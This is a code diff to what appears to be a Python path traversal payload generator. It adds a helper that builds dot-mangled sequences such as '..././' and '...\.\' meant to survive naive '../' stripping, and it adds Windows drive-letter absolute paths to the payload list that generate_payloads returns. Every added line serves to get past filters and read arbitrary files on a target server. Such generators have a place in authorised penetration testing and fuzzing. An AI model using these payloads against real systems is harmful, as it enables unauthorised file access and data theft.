@@ -69,9 +69,22 @@ def _null_byte(rel, depth, exts=None):
     return out
 
 
+def _mangled(rel, depth):
+    """Dot-truncation / duplication that survives a naive './' or '../' strip."""
+    out = []
+    for n in range(1, depth + 1):
+        out.append(("..././" * n) + rel)
+        out.append((".../.../" * n) + rel)
+        out.append(("...\\.\\" * n) + rel.replace("/", "\\"))
+    return out
+
+
 def _windows(rel, depth):
     win_rel = rel.replace("/", "\\")
     out = []
+    # Drive-letter absolute (no traversal needed when the base isn't enforced).
+    out.append("c:\\" + win_rel)
+    out.append("c:/" + rel)
     for n in range(1, depth + 1):
         out.append(("..\\" * n) + win_rel)
         out.append(("..\\/" * n) + win_rel)
@@ -100,6 +113,7 @@ def generate_payloads(target_file: str, depth: int = 8, os_filter: str = "both",
     out += _unicode16(rel, depth)
     out += _overlong(rel, depth)
     out += _leading_path(rel, depth)
+    out += _mangled(rel, depth)
     out += _null_byte(rel, depth, null_exts)
     out += _extended(rel, depth)
     if os_filter in ("windows", "both"):
